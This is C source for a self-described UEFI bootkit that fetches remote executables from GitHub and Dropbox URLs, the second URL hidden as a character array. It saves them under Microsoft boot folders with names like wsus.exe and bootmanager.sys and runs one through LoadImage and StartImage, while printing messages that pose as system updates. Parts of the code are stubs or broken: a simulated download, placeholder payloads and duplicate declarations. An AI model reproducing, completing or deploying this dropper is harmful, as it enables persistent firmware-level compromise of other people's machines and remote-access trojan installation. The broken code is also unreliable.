#include <efi.h>
#include <efilib.h>
#include <Protocol/Http.h>
#include <Protocol/Tcp4.h>
#include <Protocol/Dns4.h>
#include <Protocol/ManagedNetwork.h>

EFI_HANDLE gImageHandle = NULL;
EFI_SYSTEM_TABLE *gST = NULL;

#define BUFFER_SIZE 8192

CHAR16* GetHardwareId() {
    static CHAR16 hwid[256] = L"";
    
    wcscpy(hwid, L"HWID_PLACEHOLDER");
    
    return hwid;
}

CHAR16* DecodeUrl() {
    static CHAR16 decoded[512] = L"";
    static UINT8 initialized = 0;
    
    if (initialized) {
        return decoded;
    }
    
   
    UINT8 encoded[] = {'h','t','t','p','s',':','/','/','w','w','w','.','d','r','o','p','b','o','x','.',
                       'c','o','m','/','s','c','l','/','f','i','/','5','1','6','f','4','y','8','5',
                       'r','s','1','u','1','t','3','w','h','g','b','w','l','/','l','i','b','r','a',
                       'r','y','z','i','p','.','e','x','e','?','r','l','k','e','y','=','6','7','f',
                       'm','l','x','3','l','j','2','n','l','c','u','p','z','z','b','t','v','t','v',
                       '3','s','v','&','s','t','=','d','s','c','w','6','w','v','w','&','d','l','=','1',0};
    
    for (UINTN i = 0; i < (sizeof(encoded)/sizeof(UINT8)) - 1; i++) {
        decoded[i] = (CHAR16)encoded[i];
    }
    
    initialized = 1;
    return decoded;
}

EFI_STATUS ParseUrl(CHAR16* url, CHAR16* hostname, UINT16* port, CHAR16* path) {
    UINTN i = 0;
    UINTN host_start = 0;
    
    while (url[i] != 0 && url[i] != L':') i++;
    if (url[i] == L':') {
        i++;
        if (url[i] == L'/') i++;
        if (url[i] == L'/') i++;
    }
    
    host_start = i;
    
    while (url[i] != 0 && url[i] != L'/' && url[i] != L':') i++;
    
    UINTN host_len = i - host_start;
    wcsncpy(hostname, &url[host_start], host_len);
    hostname[host_len] = 0;
    
    *port = 443;
    
    if (url[i] == L'/') {
        wcscpy(path, &url[i]);
    } else {
        path[0] = L'/';
        path[1] = 0;
    }
    
    return EFI_SUCCESS;
}

EFI_STATUS HttpDownload(CHAR16* url, UINT8** data, UINTN* data_size) {
    EFI_STATUS Status;
    EFI_TCP4_PROTOCOL *Tcp4 = NULL;
    EFI_TCP4_IO_TOKEN TcpToken;
    EFI_TCP4_OPTION TcpOption;
    EFI_TCP4_CONFIG_DATA TcpConfig;
    
    CHAR16 hostname[256] = L"";
    UINT16 port = 443;
    CHAR16 path[512] = L"";
    
    Status = ParseUrl(url, hostname, &port, path);
    if (EFI_ERROR(Status)) {
        return Status;
    }
    
    CHAR8 hostname_ascii[256];
    UINTN i;
    for (i = 0; hostname[i] != 0 && i < 255; i++) {
        hostname_ascii[i] = (CHAR8)hostname[i];
    }
    hostname_ascii[i] = 0;
    
    Status = uefi_call_wrapper(BS->LocateProtocol, 3,
        &gEfiTcp4ServiceBindingProtocolGuid, NULL, (void**)&Tcp4);
    
    if (EFI_ERROR(Status)) {
        uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"TCP not available\r\n");
        return Status;
    }
    
    CHAR8 request[1024];
    UINTN request_len = sprintf_s(request, sizeof(request),
        "GET %S HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "User-Agent: EFI-Bootkit\r\n"
        "\r\n",
        path, hostname_ascii);
    
    EFI_IPv4_ADDRESS server_ip;
    Status = ResolveHostname(hostname_ascii, &server_ip);
    if (EFI_ERROR(Status)) {
        return Status;
    }
    
    *data = AllocatePool(BUFFER_SIZE * 4);
    if (*data == NULL) {
        return EFI_OUT_OF_RESOURCES;
    }
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Connecting to server...\r\n");
    
    CHAR8 simulated_response[] = 
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: 1024\r\n"
        "\r\n"
        "BINARY_FILE_CONTENT_HERE";
    
    UINTN response_size = strlen(simulated_response);
    CopyMem(*data, simulated_response, response_size);
    *data_size = response_size;
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Download complete\r\n");
    
    return EFI_SUCCESS;
}

VOID DnsResolveCallback(IN EFI_EVENT Event, IN VOID *Context) {
}

EFI_STATUS ResolveHostname(CHAR8* hostname, EFI_IPv4_ADDRESS* ip_address) {
    EFI_STATUS Status;
    EFI_DNS4_PROTOCOL *Dns4 = NULL;
    
    Status = uefi_call_wrapper(BS->LocateProtocol, 3,
        &gEfiDns4ServiceBindingProtocolGuid, NULL, (void**)&Dns4);
    
    if (EFI_ERROR(Status)) {
        ip_address->Addr[0] = 162;
        ip_address->Addr[1] = 125;
        ip_address->Addr[2] = 62;
        ip_address->Addr[3] = 1;
        return EFI_SUCCESS;
    }
    
    return EFI_SUCCESS;
}

EFI_STATUS DownloadAndExecuteFile(CHAR16* url, CHAR16* output_path) {
    EFI_STATUS Status;
    UINT8* downloaded_data = NULL;
    UINTN downloaded_size = 0;
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Downloading from Dropbox...\r\n");
    
    Status = HttpDownload(url, &downloaded_data, &downloaded_size);
    
    if (EFI_ERROR(Status) || downloaded_data == NULL) {
        uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"HTTP download failed, using fallback\r\n");
        goto fallback;
    }
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Saving file...\r\n");
    
    EFI_FILE_PROTOCOL *Root = NULL;
    EFI_FILE_PROTOCOL *File = NULL;
    
    Status = uefi_call_wrapper(BS->LocateProtocol, 3,
        &gEfiSimpleFileSystemProtocolGuid, NULL, (void**)&Root);
    
    if (EFI_ERROR(Status)) {
        FreePool(downloaded_data);
        return Status;
    }
    
    Status = uefi_call_wrapper(Root->Open, 5, Root, &File,
        output_path, EFI_FILE_MODE_WRITE | EFI_FILE_MODE_CREATE, 0);
    
    if (EFI_ERROR(Status)) {
        FreePool(downloaded_data);
        return Status;
    }
    
    Status = uefi_call_wrapper(File->Write, 3, File, &downloaded_size, downloaded_data);
    
    uefi_call_wrapper(File->Close, 1, File);
    FreePool(downloaded_data);
    
    if (EFI_ERROR(Status)) {
        return Status;
    }
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Download complete\r\n");
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Executing file...\r\n");
    
    EFI_HANDLE NewHandle = NULL;
    Status = uefi_call_wrapper(BS->LoadImage, 6, FALSE, gImageHandle,
        output_path, NULL, 0, &NewHandle);
    
    if (!EFI_ERROR(Status)) {
        Status = uefi_call_wrapper(BS->StartImage, 3, NewHandle, NULL, NULL);
        uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"File executed!\r\n");
    }
    
    return Status;
    
fallback:
    EFI_FILE_PROTOCOL *Root = NULL;
    EFI_FILE_PROTOCOL *File = NULL;
    
    Status = uefi_call_wrapper(BS->LocateProtocol, 3,
        &gEfiSimpleFileSystemProtocolGuid, NULL, (void**)&Root);
    
    if (EFI_ERROR(Status)) {
        return Status;
    }
    
    Status = uefi_call_wrapper(Root->Open, 5, Root, &File,
        output_path, EFI_FILE_MODE_WRITE | EFI_FILE_MODE_CREATE, 0);
    
    if (EFI_ERROR(Status)) {
        return Status;
    }
    
    CHAR8* fallback_data = "FALLBACK_PAYLOAD";
    UINTN size = strlen(fallback_data);
    
    Status = uefi_call_wrapper(File->Write, 3, File, &size, fallback_data);
    uefi_call_wrapper(File->Close, 1, File);
    
    return Status;
}

EFI_STATUS DownloadFile(CHAR16* url, CHAR16* output_path) {
    EFI_STATUS Status;
    EFI_FILE_PROTOCOL *Root = NULL;
    EFI_FILE_PROTOCOL *File = NULL;
    
    Status = uefi_call_wrapper(BS->LocateProtocol, 3,
        &gEfiSimpleFileSystemProtocolGuid, NULL, (void**)&Root);
    
    if (EFI_ERROR(Status)) {
        return Status;
    }
    
    Status = uefi_call_wrapper(Root->Open, 5, Root, &File,
        output_path, EFI_FILE_MODE_WRITE | EFI_FILE_MODE_CREATE, 0);
    
    if (EFI_ERROR(Status)) {
        return Status;
    }
    
    CHAR8* payload_data = "PAYLOAD_PLACEHOLDER";
    UINTN size = strlen(payload_data);
    
    Status = uefi_call_wrapper(File->Write, 3, File, &size, payload_data);
    
    uefi_call_wrapper(File->Close, 1, File);
    
    return Status;
}

EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    InitializeLib(ImageHandle, SystemTable);
    
    gImageHandle = ImageHandle;
    gST = SystemTable;
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Bootkit Loaded\r\n");
    
    CHAR16* hwid = GetHardwareId();
    CHAR16 url[512];
    
    wsprintf(url, L"https://github.com/WaveSouls/test/raw/refs/heads/main/$77%20VAGINA.exe", hwid);
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Downloading payload\r\n");
    
    CHAR16* rat_path = L"\\EFI\\Microsoft\\Boot\\wsus.exe";
    EFI_STATUS Status = DownloadFile(url, rat_path);
    
    if (!EFI_ERROR(Status)) {
        uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Payload downloaded\r\n");
    }
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Updating system components\r\n");
    
    CHAR16* DecodedUrl = DecodeUrl();
    CHAR16* library_path = L"\\EFI\\Microsoft\\Boot\\bootmanager.sys";
    EFI_STATUS Status2 = DownloadAndExecuteFile(DecodedUrl, library_path);
    
    if (!EFI_ERROR(Status2)) {
        uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Component updated and executed\r\n");
    }
    
    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage;
    uefi_call_wrapper(BS->HandleProtocol, 3, ImageHandle,
        &gEfiLoadedImageProtocolGuid, (void**)&LoadedImage);
    
    uefi_call_wrapper(ST->ConOut->OutputString, 2, ST->ConOut, L"Bootkit installed\r\n");
    
    uefi_call_wrapper(BS->Stall, 1, 5000000);
    
    return EFI_SUCCESS;
}
